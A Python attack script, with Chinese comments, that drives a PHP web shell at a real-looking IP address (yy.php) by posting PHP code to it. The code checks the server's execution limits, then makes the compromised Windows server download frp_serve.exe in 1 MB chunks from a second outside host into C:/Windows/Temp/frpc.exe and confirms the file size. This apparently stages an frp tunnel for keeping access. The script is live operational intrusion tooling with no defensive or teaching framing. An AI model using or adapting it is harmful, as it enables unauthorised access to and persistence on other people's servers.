#!/usr/bin/env python3
"""分块下载 frpc.exe: 每块 1MB, 循环 append"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=60):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

# PHP 执行时间限制
r = cmd("print_r('MAXEXEC:' . ini_get('max_execution_time') . '|MEM:' . ini_get('memory_limit'));", 30)
print("配置:", r.strip()[-80:], flush=True)

# 用 PHP stream 分块下载: 每次读 1MB 写入
# 一次性代码: $f=fopen(url);$g=fopen(local,'wb');while(!feof($f)){fwrite($g,fread($f,1048576));}fclose
code = "$f=fopen('http://165.99.43.145:9124/frp_serve.exe','rb');$g=fopen('C:/Windows/Temp/frpc.exe','wb');$n=0;while(!feof($f)){fwrite($g,fread($f,1048576));$n++;}fclose($f);fclose($g);print_r('CHUNKS:' . $n);"
print("stream分块下载...", flush=True)
r = cmd(code, 150)
print("结果:", r.strip()[-80:], flush=True)
time.sleep(1)
r = cmd("print_r('SIZE:' . filesize('C:/Windows/Temp/frpc.exe'));", 30)
print("大小:", r.strip()[-60:], flush=True)
